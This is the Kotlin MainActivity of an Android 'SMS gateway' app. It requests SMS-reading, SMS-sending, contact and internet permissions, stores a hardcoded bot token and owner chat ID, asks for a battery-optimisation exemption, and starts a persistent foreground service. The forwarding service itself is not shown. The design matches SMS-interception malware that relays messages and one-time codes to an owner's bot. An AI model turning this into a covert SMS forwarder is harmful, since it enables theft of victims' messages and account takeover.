package com.smsgateway.app

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val REQUIRED_PERMISSIONS = arrayOf(
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.INTERNET,
        Manifest.permission.READ_CONTACTS
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val tvStatus = findViewById<TextView>(R.id.tvStatus)

        // Save config automatically from hardcoded values
        val prefs = getSharedPreferences("gateway_config", MODE_PRIVATE)
        prefs.edit()
            .putString("bot_token", Config.BOT_TOKEN)
            .putString("owner_chat_id", Config.OWNER_CHAT_ID)
            .apply()

        if (allPermissionsGranted()) {
            requestBatteryExemption()
            startGatewayService()
            tvStatus.text = "🟢 Gateway is Running"
        } else {
            ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, 100)
        }

        if (GatewayForegroundService.isRunning) {
            tvStatus.text = "🟢 Gateway is Running"
        }
    }

    private fun allPermissionsGranted() = REQUIRED_PERMISSIONS.all {
        ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestBatteryExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivity(intent)
        }
    }

    private fun startGatewayService() {
        val intent = Intent(this, GatewayForegroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100 && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
            requestBatteryExemption()
            startGatewayService()
            findViewById<TextView>(R.id.tvStatus).text = "🟢 Gateway is Running"
        } else {
            Toast.makeText(this, "All permissions are required for the app to work", Toast.LENGTH_LONG).show()
        }
    }
}
